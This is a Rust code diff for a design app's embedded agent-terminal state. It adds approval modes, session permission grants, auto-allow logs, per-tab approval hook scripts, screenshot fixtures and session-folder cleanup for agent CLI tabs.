+    pub fn open_approval_fixture(&mut self, preset_slug: &str, file_path: Option<&Path>, mode: crate::agent_permissions::AgentPermissionMode) {
+        self.permission_mode = mode;
+        self.ensure_default_tab(file_path);
+        if let Some(tab) = self.active_tab_mut() {
+            tab.permission_mode = mode;
+        }
+        let now = crate::agent_sessions::unix_timestamp_secs();
+        let Some(approvals_dir) = self.active_tab().and_then(|tab| tab.approvals_dir.clone()) else {
+            return;
+        };
+        let _ = crate::agent_approval_channel::create_private_dir_all(&approvals_dir);
+        let risky = mode == crate::agent_permissions::AgentPermissionMode::AskRisky;
         match preset_slug {
             "agents-approval-command" => {
                 if let Some(tab) = self.active_tab_mut() {
@@ -1634,8 +2044,9 @@ impl TerminalState {
                 }
                 let req = serde_json::json!({
                     "id": "1001-Bash",
-                    "tool_name": "Bash",
+                    "tool_name": if risky { "designos_update_node" } else { "Bash" },
                     "summary": "cargo test -p designos-app --bin designos",
+                    "target": if risky { "node_id:12:34" } else { "" },
                     "timestamp": now,
                 });
                 let _ = std::fs::write(approvals_dir.join("1001-Bash.request.json"), req.to_string());
@@ -1670,8 +2081,101 @@ impl TerminalState {
                     }
                 }
             }
+            "agents-approval-background-tab" => {
+                if let Some(tab) = self.active_tab_mut() {
+                    tab.preset = AgentCliPreset::Codex;
+                    tab.title = "Codex CLI #1".into();
+                    tab.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
+                    if let Ok(mut st) = tab.agent_status.lock() {
+                        *st = AgentTabStatus::WaitingForInput(Some(NEEDS_APPROVAL_LABEL.into()));
+                    }
+                }
+                let _ = self.spawn_tab(AgentCliPreset::Shell, file_path);
+                if let Some(tab) = self.active_tab_mut() {
+                    tab.preset = AgentCliPreset::Claude;
+                    tab.title = "Claude Code #2".into();
+                    tab.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
+                }
+            }
+            "agents-scrollback" => {
+                // The shell's first prompt can land before this text: start from a cleared screen so it never joins line 1.
+                let mut history = String::from("\x1b[H\x1b[2J");
+                for idx in 1..=120 {
+                    history.push_str(&format!("[{idx:03}] Inspecting layer tokens and scrollback\r\n"));
+                }
+                if let Some(tab) = self.active_tab_mut() {
+                    tab.preset = AgentCliPreset::Grok;
+                    tab.title = "Grok CLI #1".into();
+                    if let Ok(mut st) = tab.agent_status.lock() {
+                        *st = AgentTabStatus::WaitingForInput(Some(NEEDS_APPROVAL_LABEL.into()));
+                    }
+                    if let Ok(mut parser) = tab.parser.lock() {
+                        parser.process(history.as_bytes());
+                        parser.set_scrollback(45);
+                    }
+                    tab.restore_scrollback.store(45, std::sync::atomic::Ordering::Release);
+                }
+            }
             _ => {}
         }
+    }
+
+    pub fn seed_screenshot_cli_probes(&mut self) {
+        use crate::agent_cli_catalog::{CliProbe, SignIn};
+        for (preset, version) in [
+            (AgentCliPreset::Claude, "2.1.302"),
+            (AgentCliPreset::Codex, "0.163.0"),
+            (AgentCliPreset::Grok, "1.0.62"),
+            (AgentCliPreset::Gemini, "0.38.2"),
+            (AgentCliPreset::Antigravity, "1.0"),
+        ] {
+            self.picker.cache.set_probe(preset, CliProbe { installed: true, version: Some(version.into()), signed_in: SignIn::Yes });
+        }
+        self.picker.probe_started = true;
+    }
+
+    pub fn open_ask_risky_screenshot_fixture(&mut self, _file_path: Option<&Path>) {
+        self.permission_mode = crate::agent_permissions::AgentPermissionMode::AskRisky;
+        self.seed_screenshot_cli_probes();
+        self.picker_open = true;
+        let now_secs = crate::agent_sessions::unix_timestamp_secs();
+        let _ = self.session_grants.insert(&self.session_id, "designos_update_node", "node_id:12:34", now_secs);
+        let now = std::time::Instant::now();
+        self.active_turn_ledger_mut().record_auto_allow(vec![
+            crate::agent_permissions::AutoAllowRow {
+                timestamp: now_secs,
+                tool_name: "designos_get_document".into(),
+                target: String::new(),
+                reason: crate::agent_permissions::AutoAllowReason::Tier,
+                kind: crate::agent_permissions::AutoAllowKind::Informational,
+                tab: None,
+            },
+            crate::agent_permissions::AutoAllowRow {
+                timestamp: now_secs,
+                tool_name: "designos_create_node".into(),
+                target: "node_id:1:2".into(),
+                reason: crate::agent_permissions::AutoAllowReason::Tier,
+                kind: crate::agent_permissions::AutoAllowKind::Revertable,
+                tab: None,
+            },
+        ]);
+        self.active_turn_ledger_mut().ingest_marks(
+            [
+                crate::agent_turn_marks::TurnMarkLine {
+                    v: crate::agent_turn_marks::TURN_MARK_VERSION,
+                    turn_mark: crate::agent_turn_marks::TurnPhase::Start,
+                    cli: Some("claude".into()),
+                    patch_bytes: 0,
+                },
+                crate::agent_turn_marks::TurnMarkLine {
+                    v: crate::agent_turn_marks::TURN_MARK_VERSION,
+                    turn_mark: crate::agent_turn_marks::TurnPhase::End,
+                    cli: Some("claude".into()),
+                    patch_bytes: 0,
+                },
+            ],
+            now,
+        );
     }
 
     /// Returns the turn ledger for `tab_idx` (or the fallback ledger when no tabs are spawned).
@@ -1694,6 +2198,27 @@ impl TerminalState {
         self.ledger_for_tab(idx)
     }
 
+    pub fn poll_auto_allow_into_active(&mut self) {
+        let rows = self.auto_allow_log.poll();
+        self.distribute_auto_allow_rows(rows);
+    }
+
+    pub fn poll_auto_allow_into_tab(&mut self, _tab_idx: usize) {
+        let rows = self.auto_allow_log.poll();
+        self.distribute_auto_allow_rows(rows);
+    }
+
+    fn distribute_auto_allow_rows(&mut self, rows: Vec<crate::agent_permissions::AutoAllowRow>) {
+        if rows.is_empty() {
+            return;
+        }
+        let fallback = self.active_tab.min(self.tabs.len().saturating_sub(1));
+        for row in rows {
+            let idx = row.tab.and_then(|id| self.tabs.iter().position(|tab| tab.id as u64 == id)).unwrap_or(fallback);
+            self.ledger_for_tab_mut(idx).record_auto_allow(vec![row]);
+        }
+    }
+
     /// Mutable access to the active tab's turn ledger (or the fallback ledger when no tabs are spawned).
     pub fn active_turn_ledger_mut(&mut self) -> &mut crate::agent_turn_ledger::AgentTurnLedger {
         let idx = self.active_tab.min(self.tabs.len().saturating_sub(1));
@@ -1702,7 +2227,7 @@ impl TerminalState {
 
     /// True when `tab_idx` is currently in [`AgentTabStatus::Working`].
     pub fn is_tab_working(&self, tab_idx: usize) -> bool {
-        self.tabs.get(tab_idx).is_some_and(|t| matches!(t.agent_status.lock().ok().as_deref(), Some(AgentTabStatus::Working(_))))
+        self.tabs.get(tab_idx).is_some_and(|t| matches!(t.effective_status(), AgentTabStatus::Working(_)))
     }
 
     /// True when `preset`'s binary is reachable the way a spawn would find it: the shared PATH, the user CLI
@@ -1712,7 +2237,7 @@ impl TerminalState {
         if let Some(ref p) = self.path_override {
             return runtime_binary_available_in(preset.binary_name(), Some(p.as_os_str()), false);
         }
-        preset.is_installed() || self.path_prepend.iter().any(|d| d.join(preset.binary_name()).is_file())
+        preset_reachable_with_prepend(preset, &self.path_prepend)
     }
 
     /// OpenCode is not in the picker's probed catalog, so its presence is checked on PATH once per probe cycle
@@ -1744,7 +2269,7 @@ impl TerminalState {
         })
     }
 
-    /// What a sample-prompt click can start: the first installed built-in CLI, else the first saved `"Other CLI…"` entry.
+    /// What the agent menu can start: the first installed built-in CLI, else the first saved `"Other CLI…"` entry.
     pub fn first_startable_agent_cli(&mut self) -> Option<StartableAgentCli> {
         if let Some(preset) = self.first_installed_agent_cli() {
             return Some(StartableAgentCli::Preset(preset));
@@ -1756,47 +2281,6 @@ impl TerminalState {
     /// Returns `true` when at least one agent CLI can be started: a built-in one or a saved custom one (`#688` §3 rule 6).
     pub fn any_agent_cli_installed(&mut self) -> bool {
         self.first_startable_agent_cli().is_some()
-    }
-
-    /// Makes an agent tab that accepts input the active tab when the user clicks a sample prompt in the empty
-    /// state: the first live agent tab, else a new session on the first startable CLI (`#688`). The caller fills the
-    /// composer afterwards, so the draft lands in the tab that is active when the click is handled.
-    /// A draft typed into an exited active tab moves to the tab that takes over, so no text is left behind.
-    /// Returns `false` when no session could be started; the reason is in `sample_prompt_error`.
-    pub fn ensure_agent_session_for_sample_prompt(&mut self, file_path: Option<&Path>) -> bool {
-        self.sample_prompt_error = None;
-        let active = self.active_tab;
-        let dead_active = self.tabs.get_mut(active).is_some_and(|t| !t.accepts_agent_input()).then_some(active);
-        let started = if let Some(idx) = self.tabs.iter_mut().position(|t| t.accepts_agent_input()) {
-            self.active_tab = idx;
-            if matches!(self.active_runtime, AgentCliPreset::Shell | AgentCliPreset::DesignOsHelp) {
-                self.active_runtime = self.tabs[idx].spawn_preset;
-            }
-            true
-        } else {
-            let spawned = match self.first_startable_agent_cli() {
-                Some(StartableAgentCli::Preset(preset)) => {
-                    self.active_runtime = preset;
-                    self.spawn_tab(preset, file_path).map_err(|_| preset.tab_title().to_string())
-                }
-                Some(StartableAgentCli::Custom(entry)) => self.spawn_custom_cli_tab(&entry.label, &entry.command, file_path).map_err(|_| entry.label.clone()),
-                None => Err("an agent CLI".to_string()),
-            };
-            if let Err(name) = &spawned {
-                self.sample_prompt_error = Some(format!("Couldn't start {name}."));
-            }
-            spawned.is_ok()
-        };
-        if !started {
-            return false;
-        }
-        self.viewport_focused = false;
-        if let Some(dead) = dead_active.filter(|d| *d != self.active_tab) {
-            let stranded = std::mem::take(&mut self.tabs[dead].composer.draft);
-            self.tabs[dead].composer.cursor = None;
-            crate::agent_sample_prompts::apply_sample_prompt_to_draft(&mut self.tabs[self.active_tab].composer.draft, &stranded);
-        }
-        true
     }
 
     /// Creates a `TerminalState` bound to `file_id` (and `lib_root` when provided) with `doc_name`.
@@ -1826,10 +2310,11 @@ impl TerminalState {
     }
 
     fn update_session_dir_paths(&mut self, session_dir: PathBuf) {
+        let session_changed = self.session_dir != session_dir;
         // Skills replies written into the folder being left go with it. Tabs that still wait to deliver rewrite theirs, into the new
         // folder, on the next `sync_hook_reply`.
         for (tab_id, chunks) in std::mem::take(&mut self.reply_skills) {
-            crate::skills::hook_delivery::remove_replies(&self.session_dir, tab_id, 0..chunks.len());
+            crate::skills::hook_delivery::remove_replies(self.hook_paths().dir(), tab_id, 0..chunks.len());
         }
         self.snapshot_worker.cancel_and_wait();
         self.session_closed = false;
@@ -1842,28 +2327,36 @@ impl TerminalState {
         self.selection_spec_path = session_dir.join("selection.spec.json");
         self.bootstrap_md_path = session_dir.join("bootstrap.md");
         self.bootstrap_json_path = session_dir.join("bootstrap.json");
+        // The folder being left takes its approval channel with it, unless a tab still runs on it.
+        if self.tabs.is_empty() && self.session_dir != session_dir {
+            crate::agent_approval_channel::remove_channel(&self.session_dir);
+        }
         self.session_dir = session_dir;
+        self.clear_tab_closed_mark();
         // A reply a run left in the folder now bound (Studio quit before the prompt hook ran) must not reach this run's prompts.
-        crate::skills::hook_delivery::remove_all_replies(&self.session_dir);
-        self.last_watched_mtime = std::fs::metadata(&self.live_spec_path).and_then(|m| m.modified()).ok();
+        crate::skills::hook_delivery::remove_all_replies(self.hook_paths().dir());
+        self.last_watched_mtime = spec_mtime(&self.live_spec_path);
         self.live_patch = crate::live_patch_log::LivePatchLog::bind(self.session_dir.join("doc-patch.jsonl"));
-        self.turn_marks = crate::agent_turn_marks::TurnMarkLog::bind(self.session_dir.join("turn-marks.jsonl"));
-        self.event_stream = crate::agent_turn_status::AgentEventStream::bind(self.session_dir.join("agent-events.jsonl"));
+        self.turn_marks = crate::agent_turn_marks::TurnMarkLog::bind(self.hook_paths().turn_marks());
+        self.event_stream = crate::agent_turn_status::AgentEventStream::bind(self.hook_paths().events());
+        self.auto_allow_log = crate::agent_permissions::AutoAllowLog::bind(&self.session_dir);
         self.last_synced_key = None;
         self.last_bootstrap_key = None;
         self.bootstrap_markdown = None;
         self.bootstrap_job = None;
         self.bootstrap_generation.store(0, std::sync::atomic::Ordering::SeqCst);
         self.pending_approvals.clear();
+        if session_changed {
+            self.session_grants.clear();
+        }
         for tab in &mut self.tabs {
-            tab.approvals_dir = crate::agent_permissions::tab_approvals_dir(&self.session_dir, tab.id);
+            tab.approvals_dir = crate::agent_approval_channel::tab_approvals_dir(&self.session_dir, tab.id);
             tab.pending_approvals.clear();
         }
-        crate::agent_permissions::cleanup_stale_approvals(&self.session_dir, crate::agent_sessions::unix_timestamp_secs());
         self.last_agent_status_done = false;
     }
 
-    /// Re-binds this terminal state to `session_id` under `/tmp/designos-sessions/<session_id>`.
+    /// Re-binds this terminal state to `session_id` under `<data dir>/designos/sessions/<session_id>`.
     /// When already bound to a library file and holding its `session.lock`, updates `self.session_id`
     /// while preserving `<lib_root>/agent-sessions/<file_id>` as `self.session_dir`.
     pub fn bind_session(&mut self, session_id: &str) {
@@ -1871,11 +2364,14 @@ impl TerminalState {
         if clean.is_empty() {
             return;
         }
+        if self.session_id != clean {
+            self.session_grants.clear();
+        }
         if matches!(self.key, crate::agent_sessions::SessionKey::LibraryFile { .. }) {
             self.session_id = clean.to_string();
             self.active_run_id = format!("{clean}-1-{}", self.next_run_seq.max(1));
             if self.lock_owner.is_none() && self.tabs.is_empty() {
-                let fallback_dir = std::env::temp_dir().join("designos-sessions").join(clean);
+                let fallback_dir = crate::agent_session_files::ephemeral_session_dir(clean);
                 if self.session_dir != fallback_dir {
                     self.update_session_dir_paths(fallback_dir);
                 }
@@ -1885,14 +2381,14 @@ impl TerminalState {
         if self.session_id == clean {
             return;
         }
-        let session_dir = std::env::temp_dir().join("designos-sessions").join(clean);
+        let session_dir = crate::agent_session_files::ephemeral_session_dir(clean);
         self.session_id = clean.to_string();
         self.key = crate::agent_sessions::SessionKey::Fallback(clean.to_string());
         self.update_session_dir_paths(session_dir);
     }
 
     /// Binds this terminal state to `<lib_root>/agent-sessions/<file_id>/` (`#653`), acquiring
-    /// `session.lock` for `window_id` or falling back to `/tmp/designos-sessions/<window_id>` if
+    /// `session.lock` for `window_id` or falling back to `<data dir>/designos/sessions/<window_id>` if
     /// another live Studio window already holds the lock.
     pub fn bind_library_file(&mut self, lib_root: &Path, file_id: &str, window_id: &str) {
         self.bind_library_file_with_liveness(lib_root, file_id, window_id, crate::agent_sessions::is_pid_alive);
@@ -2009,6 +2505,8 @@ impl TerminalState {
     /// Skip never outlives the setting. Without a library the in-memory mode stays.
     fn refresh_permission_mode_from_disk(&mut self) {
         if let Some(root) = self.library_root.as_deref() {
+            #[cfg(test)]
+            MODE_READS.with(|reads| reads.set(reads.get() + 1));
             self.permission_mode = crate::agent_permissions::load_permission_mode(root);
         }
     }
@@ -2080,7 +2578,7 @@ impl TerminalState {
         }
     }
 
-    /// Detaches from any library file and binds to an ephemeral fallback `/tmp/designos-sessions/<session_id>`.
+    /// Detaches from any library file and binds to an ephemeral fallback `<data dir>/designos/sessions/<session_id>`.
     pub fn unbind_library_file(&mut self, session_id: &str) {
         let clean = if session_id.trim().is_empty() { self.session_id.clone() } else { session_id.trim().to_string() };
         let target_key = crate::agent_sessions::SessionKey::Fallback(clean.clone());
@@ -2097,6 +2595,17 @@ impl TerminalState {
     }
 
     /// Builds a [`SessionEnv`] snapshot for this terminal state's per-file session.
+    /// Where the hooks of this window's agent tabs report to (`agent_hook_outputs`): nothing a hook writes is in the session folder.
+    pub fn hook_paths(&self) -> crate::agent_hook_outputs::HookPaths {
+        crate::agent_hook_outputs::HookPaths::locate(&self.session_dir)
+    }
+
+    /// [`Self::hook_paths`] with the folder made, for a test that writes what a hook would.
+    #[cfg(test)]
+    pub(crate) fn prepared_hook_paths(&self) -> crate::agent_hook_outputs::HookPaths {
+        crate::agent_hook_outputs::HookPaths::prepare(&self.session_dir).expect("the hook folder is made")
+    }
+
     pub fn session_env(&self) -> SessionEnv {
         SessionEnv {
             session_id: self.session_id.clone(),
@@ -2118,6 +2627,10 @@ impl TerminalState {
             #[cfg(test)]
             path_override: self.path_override.clone(),
             tab_session_uuid: None,
+            claude_mcp_config: crate::agent_permissions::claude_mcp_config_value(&self.session_dir, self.permission_mode),
+            claude_settings: crate::agent_permissions::claude_settings_value(&self.session_dir, self.permission_mode),
+            claude_plugin: crate::agent_permissions::claude_plugin_value(&self.session_dir, self.permission_mode),
+            gemini_system_defaults: None,
         }
     }
 
@@ -2140,17 +2653,22 @@ impl TerminalState {
     /// Returns `true` once the active `run_id` has already delivered its first-turn `bootstrap.md`
     /// block through the Claude `UserPromptSubmit` hook (which leaves a `bootstrap.delivered.<run_id>` marker).
     pub fn is_run_bootstrap_delivered(&self) -> bool {
-        self.session_dir.join(format!("bootstrap.delivered.{}", self.run_id)).exists()
+        self.hook_paths().delivered_marker(self.run_id).exists()
     }
 
     /// Starts or restarts an agent run, advancing `run_id` so the next prompt / hook invocation
     /// delivers the 7-section `bootstrap.md` block once (`E15-16 §3.2`, `§10`).
-    pub fn reset_agent_run(&mut self, file_path: Option<&Path>) {
+    pub fn reset_agent_run(&mut self, file_path: Option<&Path>) -> Option<std::io::Error> {
+        self.reset_agent_run_exact(file_path, None)
+    }
+
+    /// [`Self::reset_agent_run`] for a tab of a CLI whose project config must be made exactly Studio's (`exact`).
+    fn reset_agent_run_exact(&mut self, file_path: Option<&Path>, exact: Option<crate::agent_session_files::ExactProjectConfig>) -> Option<std::io::Error> {
         self.run_id = self.run_id.saturating_add(1);
         self.last_bootstrap_key = None;
         self.bootstrap_markdown = None;
         self.bootstrap_job = None;
-        self.provision_session_agent_files(file_path);
+        self.provision_session_agent_files_exact(file_path, exact)
     }
 
     /// Spawns a background bootstrap build job (`E15-16 §3.2`, `§8.5`, `§11`) with a lazy
@@ -2192,7 +2710,7 @@ impl TerminalState {
         let job_gen = self.bootstrap_generation.fetch_add(1, std::sync::atomic::Ordering::SeqCst) + 1;
         let gen_bg = Arc::clone(&self.bootstrap_generation);
         let write_lock_bg = Arc::clone(&self.bootstrap_write_lock);
-        let _ = std::fs::remove_file(session_dir.join("bootstrap-context-reply.json"));
+        let _ = crate::agent_session_files::remove_session_file(&crate::agent_hook_outputs::HookPaths::locate(&session_dir).bootstrap_reply());
         std::thread::spawn(move || {
             let rules = session_rules_pack(enabled_bg.as_ref());
             if let Ok(_guard) = write_lock_bg.lock() {
@@ -2283,7 +2801,7 @@ impl TerminalState {
         if let Some(md) = &self.bootstrap_markdown {
             return md.clone();
         }
-        if let Ok(md) = std::fs::read_to_string(&self.bootstrap_md_path) {
+        if let Some(md) = crate::agent_session_files::read_session_text(&self.bootstrap_md_path) {
             self.bootstrap_markdown = Some(md.clone());
             return md;
         }
@@ -2345,7 +2863,6 @@ impl TerminalState {
     /// in this file's terminal automatically targets THIS file and its currently selected page without
     /// serializing full-document JSON or writing files on the UI thread.
     pub fn sync_live_file_context(&mut self, doc: &Document, page: NodeId, selection: &[NodeId], file_path: Option<&Path>) {
-        self.prompt_context = crate::agent_sample_prompts::prompt_context(doc, page, selection);
         self.current_page_id = page.0;
         self.current_page_name = doc.get(page).map(|n| n.name.clone()).unwrap_or_else(|| "Page 1".into());
         self.doc_name = if doc.name.trim().is_empty() { "Untitled".into() } else { doc.name.clone() };
@@ -2413,7 +2930,7 @@ impl TerminalState {
                 return;
             }
             let selected_ids: Vec<u64> = selection.iter().map(|n| n.0).collect();
-            let is_scoped = doc.nodes.len() > 25_000;
+            let is_scoped = crate::live_canvas_scope::is_scoped(doc);
             let ctx_val = serde_json::json!({
                 "session_id": self.session_id,
                 "run_id": self.active_run_id,
@@ -2428,6 +2945,8 @@ impl TerminalState {
             });
             let context_bytes = serde_json::to_vec_pretty(&ctx_val).unwrap_or_default();
             let canvas_doc = if !is_scoped { doc.clone() } else { crate::live_canvas_scope::scoped_canvas(doc, page, selection, &self.doc_name) };
+            let (ask_mode, ask_risky) = self.snapshot_approval_hook_flags();
+            self.sync_tab_hook_scripts();
             self.last_synced_key = Some(key);
             self.snapshot_worker.enqueue(crate::agent_session_files::SnapshotJob {
                 session_dir: self.session_dir.clone(),
@@ -2447,8 +2966,10 @@ impl TerminalState {
                 run_id: self.active_run_id.clone(),
                 bootstrap_run_id: self.run_id,
                 agent_runtime: self.active_mcp_runtime_name().to_string(),
-                ask_mode: self.permission_mode == crate::agent_permissions::AgentPermissionMode::Ask,
+                ask_mode,
+                ask_risky,
                 unread_probe: Some(self.live_patch.unread_probe()),
+                exact_project_config: None,
             });
         }
 
@@ -2486,7 +3007,7 @@ impl TerminalState {
             if on_disk == want {
                 continue;
             }
-            write_failed |= !crate::skills::hook_delivery::write_replies(&self.session_dir, id, want, on_disk.len());
+            write_failed |= !crate::skills::hook_delivery::write_replies(self.hook_paths().dir(), id, want, on_disk.len());
             if want.is_empty() {
                 self.reply_skills.remove(&id);
             } else {
@@ -2501,19 +3022,85 @@ impl TerminalState {
     /// Deletes the skills reply files of every tab in the session folder, including any an earlier run left (`#573`).
     fn delete_skills_replies(&mut self) {
         self.reply_skills.clear();
-        crate::skills::hook_delivery::remove_all_replies(&self.session_dir);
+        crate::skills::hook_delivery::remove_all_replies(self.hook_paths().dir());
     }
 
     /// Writes the session's agent files now, on the calling thread (an agent is about to start and reads them
     /// at once). A snapshot queued earlier carries the run id and permission mode of before this start, so it
     /// is dropped (or waited for, when already writing) and `last_synced_key` is cleared: the next sync queues
-    /// a fresh one instead of letting the stale one overwrite these files.
-    fn provision_session_agent_files(&mut self, file_path: Option<&Path>) {
+    /// a fresh one instead of letting the stale one overwrite these files. The first write that failed comes back.
+    fn provision_session_agent_files(&mut self, file_path: Option<&Path>) -> Option<std::io::Error> {
+        self.provision_session_agent_files_exact(file_path, None)
+    }
+
+    /// `(ask_mode, ask_risky)` for a canvas snapshot: while any running tab uses the approval hook, the private channel stays
+    /// provisioned, and the shared fallback script only auto-allows safe tiers when every hooked tab is in `Ask when risky`.
+    fn snapshot_approval_hook_flags(&self) -> (bool, bool) {
+        if self.tabs.is_empty() {
+            (self.permission_mode.installs_approval_hook(), self.permission_mode.auto_allows_safe_tiers())
+        } else {
+            let any_ask_hook = self.tabs.iter().any(|tab| tab.permission_mode.installs_approval_hook());
+            let all_risky = any_ask_hook
+                && self.tabs.iter().filter(|tab| tab.permission_mode.installs_approval_hook()).all(|tab| tab.permission_mode.auto_allows_safe_tiers());
+            (any_ask_hook, all_risky)
+        }
+    }
+
+    /// Ensures each running tab with the approval hook keeps its own `<channel>/approve-hook-tab-<id>.sh` for the mode it started in.
+    fn sync_tab_hook_scripts(&self) {
+        if !self.tabs.iter().any(|tab| tab.permission_mode.installs_approval_hook()) {
+            return;
+        }
+        let Ok(channel_dir) = crate::agent_approval_channel::prepare_channel_dir(&self.session_dir) else {
+            return;
+        };
+        let status_file = crate::agent_hook_outputs::HookPaths::prepare(&self.session_dir).ok().map(|p| p.status());
+        for tab in &self.tabs {
+            if tab.permission_mode.installs_approval_hook() {
+                let _ = crate::agent_permissions::install_tab_hook_script(&channel_dir, status_file.as_deref(), tab.id, tab.permission_mode);
+            }
+        }
+    }
+
+    /// [`Self::provision_session_agent_files`] that also makes the project config of `exact` exactly Studio's, and then returns
+    /// the first error of that CLI's files.
+    fn provision_session_agent_files_exact(
+        &mut self,
+        file_path: Option<&Path>,
+        exact: Option<crate::agent_session_files::ExactProjectConfig>,
+    ) -> Option<std::io::Error> {
         self.snapshot_worker.cancel_and_wait();
+        self.set_aside_note = None;
         self.session_closed = false;
+        self.clear_tab_closed_mark();
         self.write_backoff.clear();
         self.last_synced_key = None;
-        let job = crate::agent_session_files::SnapshotJob {
+        let job = self.provisioning_job(file_path, exact);
+        let res = match write_session_agent_files(&job) {
+            Ok(note) => {
+                self.set_aside_note = note;
+                None
+            }
+            Err(e) => Some(e),
+        };
+        if !job.ask_mode && self.tabs.iter().any(|tab| tab.permission_mode.installs_approval_hook()) {
+            let mut hook_job = self.provisioning_job(file_path, None);
+            let (ask_mode, ask_risky) = self.snapshot_approval_hook_flags();
+            hook_job.ask_mode = ask_mode;
+            hook_job.ask_risky = ask_risky;
+            let _ = write_session_agent_files(&hook_job);
+        }
+        self.sync_tab_hook_scripts();
+        res
+    }
+
+    /// The job that writes the session's agent files when an agent is about to start: no canvas, this run's id and permission mode.
+    fn provisioning_job(
+        &self,
+        file_path: Option<&Path>,
+        exact: Option<crate::agent_session_files::ExactProjectConfig>,
+    ) -> crate::agent_session_files::SnapshotJob {
+        crate::agent_session_files::SnapshotJob {
             session_dir: self.session_dir.clone(),
             session_id: self.session_id.clone(),
             key: (0, 0, 0),
@@ -2531,26 +3118,18 @@ impl TerminalState {
             run_id: self.active_run_id.clone(),
             bootstrap_run_id: self.run_id,
             agent_runtime: self.active_mcp_runtime_name().to_string(),
-            ask_mode: self.permission_mode == crate::agent_permissions::AgentPermissionMode::Ask,
+            ask_mode: self.permission_mode.installs_approval_hook(),
+            ask_risky: self.permission_mode.auto_allows_safe_tiers()
+                && self.tabs.iter().filter(|tab| tab.permission_mode.installs_approval_hook()).all(|tab| tab.permission_mode.auto_allows_safe_tiers()),
             unread_probe: None,
-        };
-        let _ = write_session_agent_files_for_job(&job);
+            exact_project_config: exact,
+        }
     }
 
     /// Screenshot fixture (`--panel agents-start-failure`): opens an Antigravity tab on a real
-    /// `agy` invocation that exits at once with a usage error, then waits for the failure panel.
+    /// `agy` invocation that exits at once with a usage error; the gate's 2 s `is_alive` poll waits for exit.
     pub fn open_failed_start_fixture(&mut self, file_path: Option<&Path>) {
-        if self.spawn_tab_running(AgentCliPreset::Antigravity, file_path, Some(START_FAILURE_FIXTURE_COMMAND)).is_err() {
-            return;
-        }
-        let deadline = std::time::Instant::now() + agent_start_failure::START_FAILURE_WINDOW;
-        while std::time::Instant::now() < deadline {
-            let _ = self.poll_live_agent_bridge();
-            if self.active_tab().is_some_and(|t| t.start_failure.is_some()) {
-                return;
-            }
-            std::thread::sleep(std::time::Duration::from_millis(30));
-        }
+        let _ = self.spawn_tab_running(AgentCliPreset::Antigravity, file_path, Some(START_FAILURE_FIXTURE_COMMAND));
     }
 
     /// Test helper: polls the bridge until the active tab records a start failure or `budget` passes.
@@ -2613,6 +3192,19 @@ impl TerminalState {
                 }
             }
             FixAction::RunLogin(command) => {
+                // A login that is the agent itself (Gemini, Antigravity) starts a session, so the mode decides first: refused, it
+                // leaves the banner up and shows the reason a start would get.
+                if let Some(agent) = agent_start_failure::agent_started_by_login(command) {
+                    self.refresh_permission_mode_from_disk();
+                    if let Err(reason) = self.refuse_start_in_mode(agent, false, self.permission_mode) {
+                        // Nothing in the panel paints the status line: the caption under the composer is where a refused send
+                        // writes its reason, on the composer of the tab on screen and no other.
+                        let composer = self.active_composer_mut();
+                        composer.last_outcome = Some(crate::agent_composer::SendOutcome::Refused(crate::agent_composer::RefuseReason::ModeUnavailable));
+                        composer.notice = Some(reason);
+                        return;
+                    }
+                }
                 self.clear_active_tab_session_failure();
                 // A login runs as a plain command tab: it is not an agent tab, so a quick
                 // "already signed in" exit is not reported as a failed start.
@@ -2667,12 +3259,16 @@ impl TerminalState {
     }
 
     /// Cancels/waits for any in-flight snapshot write and removes `self.session_dir` if it is an
-    /// ephemeral `/tmp/designos-sessions/<session_id>/` directory (never touching library
+    /// ephemeral `<data dir>/designos/sessions/<session_id>/` directory (never touching library
     /// `<lib_root>/agent-sessions/<file_id>/` folders or a scratch directory that still holds the
     /// only copy of a library file's session).
     fn cleanup_ephemeral_session_dir(&mut self) {
         self.snapshot_worker.cancel_and_wait();
         self.stop_bootstrap_writes();
+        // No tab is left to ask: the approval channel (hook script, requests, answers) goes with the session.
+        if self.tabs.is_empty() {
+            crate::agent_approval_channel::remove_channel(&self.session_dir);
+        }
         if crate::agent_session_files::is_ephemeral_session_dir(&self.session_dir) {
             if self.lock_owner.is_some() {
                 if let crate::agent_sessions::SessionKey::LibraryFile { ref lib_root, ref file_id } = self.key {
@@ -2683,7 +3279,7 @@ impl TerminalState {
                             return;
                         }
                     }
-                    let _ = std::fs::remove_dir_all(&self.session_dir);
+                    remove_scratch_dir_keeping_the_close_answer(&self.session_dir);
                     if self.tabs.is_empty() {
                         self.update_session_dir_paths(stable_dir);
                     } else {
@@ -2692,7 +3288,7 @@ impl TerminalState {
                     return;
                 }
             }
-            let _ = std::fs::remove_dir_all(&self.session_dir);
+            remove_scratch_dir_keeping_the_close_answer(&self.session_dir);
             self.last_synced_key = None;
             self.session_closed = true;
         }
@@ -2703,8 +3299,11 @@ impl TerminalState {
     pub fn shutdown(&mut self) {
         // Skills waiting for a first prompt that never came must not reach a later prompt of this file (`#573`).
         self.delete_skills_replies();
-        crate::agent_permissions::withdraw_pending_requests(&self.session_dir);
+        for tab in &mut self.tabs {
+            Self::withdraw_tab_approvals(tab);
+        }
         self.pending_approvals.clear();
+        self.session_grants.clear();
         let mut reg_dirty = false;
         let now = crate::agent_sessions::unix_timestamp_secs();
         for mut tab in self.tabs.drain(..) {
@@ -2725,10 +3324,29 @@ impl TerminalState {
         self.release_lock();
         // A library file's stable folder stays on disk, but this window no longer owns it: publish nothing more.
         self.session_closed = true;
+        self.mark_tab_closed();
+    }
+
+    /// Tells an agent whose MCP server outlives this tab that the tab is gone: a folder that is still on disk (a library file's) gets
+    /// `tab-closed.json`; a scratch folder was removed, and its absence says the same. The editor no longer reads this folder's log, so
+    /// the agent's next close would otherwise wait out its timeout and call itself retryable.
+    fn mark_tab_closed(&self) {
+        if !self.session_dir.is_dir() {
+            return;
+        }
+        let marker = self.session_dir.join(designos_doc::live_patch::CloseIntent::TAB_CLOSED_FILE);
+        if let Err(e) = atomic_write_session_file(&marker, b"{\"tab_closed\":true}\n") {
+            eprintln!("design:os studio: could not mark {} as closed: {e}", self.session_dir.display());
+        }
+    }
+
+    /// The folder is bound again (a tab opened the file anew): the marker of its earlier tab no longer applies.
+    fn clear_tab_closed_mark(&self) {
+        let _ = crate::agent_session_files::remove_session_file(&self.session_dir.join(designos_doc::live_patch::CloseIntent::TAB_CLOSED_FILE));
     }
 
     /// Returns `true` when the embedded terminal viewport is actively capturing raw keyboard input,
